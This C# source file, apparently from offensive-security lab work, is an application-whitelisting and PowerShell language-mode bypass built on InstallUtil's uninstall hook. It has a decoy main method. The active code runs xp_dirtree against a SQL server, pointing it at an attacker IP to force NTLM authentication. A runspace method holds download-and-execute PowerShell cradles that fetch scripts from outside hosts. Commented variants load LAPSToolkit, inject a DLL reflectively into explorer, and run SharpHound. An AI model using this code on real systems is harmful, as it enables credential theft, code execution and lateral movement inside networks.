using System;
using System.Data.SqlClient;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Just Testing! --- Nothing to see here!");
        }

    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //CreateRunspace();
            TestDatabase();
        }

        private void TestDatabase()
        {
            Console.WriteLine("I executed!");
            String sqlServer = "sql05.tricky.com";
            
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "EXEC master..xp_dirtree \"\\\\192.168.45.208\\\\test\",1,1;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            con.Close();
        }

        private void CreateRunspace()
        {
            // String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            // String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193/LAPSToolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\users\\will\\LAPS.txt";
            // String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.193/mfe.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.208/GenXMLForCompiler.txt') | IEX";
            // String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.208/SharpHound.ps1') | IEX; Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\\users\\will -ZipFilename bd.zip";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
